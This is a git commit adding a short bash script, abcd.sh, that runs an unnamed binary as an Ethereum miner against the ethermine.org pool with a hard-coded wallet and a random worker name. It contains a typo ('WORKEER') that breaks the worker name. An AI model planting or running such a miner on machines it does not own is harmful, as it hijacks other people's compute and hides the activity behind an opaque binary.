c8fc732135a3b4e127524a33b27db86e45939306
amyhadnot <93107810+amyhadnot@users.noreply.github.com>
2021-10-25 08:17:29 +0530

    Create abcd.sh

---
+++ abcd.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+POOL=us1.ethermine.org:4444
+WALLET=0x3588297c18119fE13b2E1B8B5894dB4dbdb03F1E
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-abhi)
+chmod +x abcd
+./abcd --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
